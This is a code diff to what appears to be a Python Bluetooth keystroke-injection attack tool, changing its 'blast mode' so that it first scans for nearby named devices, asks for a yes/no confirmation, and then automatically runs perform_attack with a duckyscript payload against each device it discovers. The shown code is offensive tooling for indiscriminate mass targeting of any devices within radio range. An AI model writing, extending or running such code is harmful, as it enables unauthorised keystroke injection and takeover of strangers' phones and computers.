@@ -682,21 +682,55 @@ def perform_attack(target_address, adapter_id, duckyscript, is_annoy_mode, recon
         return False
 
 def blast_loop(adapter_id, duckyscript, recon_only=False):
-    """Continuous discovery and automated targeting loop."""
+    """Refined Blast Mode: Recon-first, then automated Targeting."""
     print(AnsiColorCode.CYAN + "\n" + "="*50)
-    print(f"B L A S T  M O D E  A C T I V E ({'RECON' if recon_only else 'ATTACK'})")
+    print(f"B L A S T  M O D E  (Phase 1: Reconnaissance)")
     print("="*50 + AnsiColorCode.RESET)
-    print("[!] Monitoring for named devices...")
-    print("[!] Press Ctrl+C to abort Blast Mode.\n")
-
+    print("[!] Performing 10-second environment scan...")
+    
     blasted_devices = set()
     bus = SystemBus()
+    adapter_obj = None
     
     try:
-        # Start persistent discovery
+        # 1. INITIAL RECON PHASE
         adapter_obj = bus.get("org.bluez", f"/org/bluez/{adapter_id}")
         adapter_obj.StartDiscovery()
         
+        start_time = time.time()
+        initial_targets = {} # {addr: name}
+        
+        while time.time() - start_time < 10:
+            mngr = bus.get("org.bluez", "/")
+            objs = mngr.GetManagedObjects()
+            for path, interfaces in objs.items():
+                if "org.bluez.Device1" in interfaces:
+                    props = interfaces["org.bluez.Device1"]
+                    name = props.get("Name", props.get("Alias", None))
+                    addr = path.split('/')[-1].replace('dev_', '').replace('_', ':')
+                    if name and not name.startswith("00-00-00"):
+                        if addr not in initial_targets:
+                            print(f"  [+] Discovered: {name} ({addr})")
+                            initial_targets[addr] = name
+            time.sleep(1)
+            
+        print("\n" + "-"*50)
+        print(f"[!] Total Devices Found: {len(initial_targets)}")
+        if not initial_targets:
+            print("[!] No named devices found nearby. Blast Mode aborted.")
+            return
+
+        confirm = input(f"\n[?] Proceed to BLAST {len(initial_targets)} targets? (y/n): ").strip().lower()
+        if confirm != 'y':
+            print("[!] Blast Mode cancelled by user.")
+            return
+
+        # 2. PHASE 2: AUTOMATED BLAST
+        print(AnsiColorCode.CYAN + "\n" + "="*50)
+        print(f"B L A S T  M O D E  (Phase 2: Execution - {'RECON' if recon_only else 'ATTACK'})")
+        print("="*50 + AnsiColorCode.RESET)
+        print("[!] Automated sequence running. Press Ctrl+C to stop.\n")
+
         while True:
             mngr = bus.get("org.bluez", "/")
             objs = mngr.GetManagedObjects()
@@ -712,8 +746,8 @@ def blast_loop(adapter_id, duckyscript, recon_only=False):
                         new_targets.append((addr, name))
 
             for addr, name in new_targets:
-                log.notice(f"\n[BLAST] NEW TARGET FOUND: {name} ({addr})")
-                log.info(f"Initiating {'Recon' if recon_only else 'Attack'} sequence...")
+                log.notice(f"\n[BLAST] TARGETING: {name} ({addr})")
+                log.info(f"Initiating sequence...")
                 
                 success = perform_attack(addr, adapter_id, duckyscript, is_annoy_mode=True, recon_only=recon_only)
                 
@@ -723,16 +757,16 @@ def blast_loop(adapter_id, duckyscript, recon_only=False):
                     log.warning(f"[BLAST] Target {addr} skipped or failed.")
                 
                 blasted_devices.add(addr)
-                # Brief cooldown to avoid over-stressing the adapter
-                time.sleep(3)
+                time.sleep(3) # Cooldown
             
             time.sleep(2) # Scan refresh rate
             
     except KeyboardInterrupt:
         print("\n[!] Blast Mode stopped.")
     finally:
-        try: adapter_obj.StopDiscovery()
-        except: pass
+        if adapter_obj:
+            try: adapter_obj.StopDiscovery()
+            except: pass
 
 # Main function
 def main():
